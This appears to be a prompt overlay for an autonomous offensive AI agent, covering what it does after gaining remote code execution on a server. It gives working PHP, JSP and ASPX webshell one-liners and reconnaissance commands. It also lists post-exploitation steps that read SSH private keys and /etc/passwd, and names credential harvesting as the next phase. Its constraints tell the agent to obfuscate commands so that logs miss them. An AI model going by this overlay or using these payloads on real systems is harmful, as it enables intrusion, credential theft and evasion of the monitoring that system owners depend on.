# RCE — Dynamic Overlay

## Metadata
- **Exploit Type**: rce
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when RCE confirmed or `exploit_type === "rce"`

---

## OVERLAY_CONTEXT

Remote Code Execution is the ultimate goal of most attacks. RCE confirms you've achieved server-side command execution. Once confirmed, immediately activate Post-Exploit for privilege escalation and credential harvesting.

---

## RCE Confirmation

When you receive a mission with `exploit_type: "rce"`, you are confirming or establishing RCE.

### On CONFIRMED RCE (from prior exploit):
```
1. Immediately emit `rce_confirmed` event
2. Do NOT continue exploitation — await Post-Exploit guidance
3. Stabilize: check OS (linux/windows), available tools, user context
```

---

## Stabilization Commands

### Linux
```bash
id
uname -a
cat /etc/os-release
whoami
pwd
ls -la /
cat /etc/passwd
netstat -tulpn
ps aux
```

### Windows
```cmd
whoami
hostname
systeminfo
net user
ipconfig /all
netstat -ano
tasklist /v
```

---

## Webshell Patterns

### PHP Webshell
```php
<?php system($_GET['cmd']); ?>
<?php echo "<pre>".shell_exec($_GET['cmd'])."</pre>"; ?>
<?php eval($_POST['code']); ?>
```

### JSP Webshell
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### ASPX Webshell
```asp
<% Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; %>
```

---

## Post-RCE Quick Wins

```bash
# Linux: Check for sudo
sudo -l

# Linux: Check crontab
cat /etc/crontab
ls -la /etc/cron.d/

# Linux: Check SSH keys
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa

# Windows: Check services
net start
wmic service list

# Windows: Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

---

## Constraints

```
- On rce_confirmed: STOP exploitation, emit event, await Post-Exploit
- NEVER delete files, corrupt databases, or modify system configurations
- Stabilize first: determine OS, user context, available tools
- For web shell: use encoded/obfuscated commands to avoid log detection
- Use SLEEP/BENCHMARK to confirm RCE on time-based blind exploitation
```

---

*Overlay version: 1.0*
